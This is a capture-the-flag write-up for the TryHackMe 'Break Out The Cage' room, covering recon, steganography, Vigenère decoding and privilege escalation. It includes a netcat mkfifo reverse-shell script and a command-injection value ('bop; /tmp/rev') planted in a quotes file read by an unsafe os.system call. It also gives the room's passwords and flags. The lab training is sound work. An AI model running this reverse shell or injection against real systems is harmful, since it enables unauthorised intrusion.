---
title: "Break Out The Cage - TryHackMe"
author: Ludovic COULON
date: 2020-06-18
hero: ./images/hero.jpeg
excerpt: "Writeup for the Break Out The Cage room on TryHackMe"
---

[TryHackMe | Break Out The Cage](https://tryhackme.com/room/breakoutthecage1)
Let's find out what his agent is up to....

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.145.194
```

```bash
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.2.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn+KLEDP81/6ceCvdFeDrLFYWSWc6UnOmmpiNeXuyr+GRvE5Eff4DOeTbiEIcHQkkPcz2QXiOLd9SMjCEgAqmZiZE/mv1HJpQfmRLOufOlf9oZ1TIZf7ehKcVqX0W3nuQeC+M2wLBse2lGhovnTSaZKLKRjQCP2yD1EzND/xFA88oFpahvr6vJfyGOTADjc83AJq9n3Gnil4Nd88xNsIKTl01Mm9ikE/3n/XFbwzYa2bYJRVr+lWWRd+EU3sYTY80PQgBiw6ZPT0QCe0lQfmcgCqu4hC+t/kyfmMRlbtjN/yZJ0gCWeVVAV+A4NNgsOqFbXUT+c6ATzYNhBXRojJED
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA3G1rdbZBOf44Cvz2YGtC5WhIHfHQhtShY8miCVHayvHM/9reA8VvLx9jBOa+iClhm/HairgvNV6pYV6Jg6MII=
|   256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiTPEbVpYmF2d/NDdhVYlXWA5PmTHhtrtlAaTiEuZOj

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
➜  TryHackMe dirb http://10.10.145.194/ -R

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Jun 15 10:10:41 2020
URL_BASE: http://10.10.145.194/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Interactive Recursion

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.145.194/ ----
==> DIRECTORY: http://10.10.145.194/contracts/
==> DIRECTORY: http://10.10.145.194/html/
==> DIRECTORY: http://10.10.145.194/images/
==> DIRECTORY: http://10.10.145.194/auditions/
+ http://10.10.145.194/index.html (CODE:200|SIZE:2453)
==> DIRECTORY: http://10.10.145.194/scripts/
+ http://10.10.145.194/server-status (CODE:403|SIZE:278)
```

<div className="Image__Medium">
  <img src="https://imgur.com/OszNOAo.png" alt="blog_image" />
</div>

As you can see by the title of the file, this mp3 is corrupted let's see if there is something hidden using stenography.

<div className="Image__Medium">
  <img src="https://imgur.com/1VoGSx0.png" alt="blog_image" />
</div>

Yep ! There is something hidden in this file the "password" is : namelesstwo

<div className="Image__Medium">
  <img src="https://imgur.com/gN4KqtG.png" alt="blog_image" />
</div>
<div className="Image__Medium">
  <img src="https://imgur.com/eVBHL57.png" alt="blog_image" />
</div>

[Vigenère Cipher - Decoder, Encoder, Solver, Translator](https://www.dcode.fr/vigenere-cipher)

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

### #1 What is Weston's password?

```bash
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

### #2 What's the user flag?

I tried to use the find command to locate all the txt files but nothing came out..

```
weston@national-treasure:~$ find / -type f -name "user.*" 2>/dev/null
```

Let's try something else .. 😢

<div className="Image__Medium">
  <img src="https://imgur.com/B1Bb9kI.png" alt="blog_image" />
</div>

As you can see there this script that we can execute with root permission let's get a reverse shell 🤤

Wait ...

<div className="Image__Medium">
  <img src="https://imgur.com/fe66YHv.png" alt="blog_image" />
</div>

When I was editing the script I noticed something interesting there is a script that write random quotes, let's find the script 🤨

You can also find the random quotes in the motd

<div className="Image__Medium">
  <img src="https://imgur.com/iQWwMqZ.png" alt="blog_image" />
</div>

```
weston@national-treasure:~$ find / -type f -name "rando*" 2>/dev/null
```

Nothing there.. 😟

```
weston@national-treasure:~$ find / -type f -name "*quotes*" 2>/dev/null
```

AH ! I found it! 😅

<div className="Image__Medium">
  <img src="https://imgur.com/tUotgtl.png" alt="blog_image" />
</div>

```python
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

Let's get a reverse shell

```bash
rm -f /tmp/rev
cat << EOF > /tmp/rev
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.2.228 4444 >/tmp/f
EOF
chmod +x /tmp/rev
printf 'bop; /tmp/rev\n' > /opt/.dads_scripts/.files/.quotes
```

Wait maybe 1 or two minutes to get a shell

<div className="Image__Medium">
  <img src="https://imgur.com/WBwzInV.png" alt="blog_image" />
</div>

```bash
ls
email_backup
Super_Duper_Checklist
cd Super*
/bin/bash: line 30: cd: Super_Duper_Checklist: Not a directory
cat Super*
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

### #3 What's the root flag?

Once you are in the cage account go to this repertory

```bash
/home/cage/email_backup
```

And cat \*

<div className="Image__Medium">
  <img src="https://imgur.com/oi1cWOc.png" alt="blog_image" />
</div>

After a while I figured out that the "password" highlighted is encoded using Vigenère encryption

But as you can see you need to provide some key to decode the password I tried "Face" because on the last paragraph the email repeat many times the word so i guess i had some chance 🥴

<div className="Image__Medium">
  <img src="https://imgur.com/junuXVj.png" alt="blog_image" />
</div>

[CyberChef](<https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('face')&input=aGFpaW5zcHN5YW5pbGVwaA>)

```bash
cageisnotalegend
```

You can also stabilized the shell using the cage's ssh key

<div className="Image__Medium">
  <img src="https://imgur.com/uWyHix4.png" alt="blog_image" />
</div>

Once you stabilized the shell you can just type "su" and type the password that we discover earlier

<div className="Image__Medium">
  <img src="https://imgur.com/ibMOroe.png" alt="blog_image" />
</div>

```bash
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/p0h00A1.png" alt="TryhackMeProfile" />
  </a>
</center>
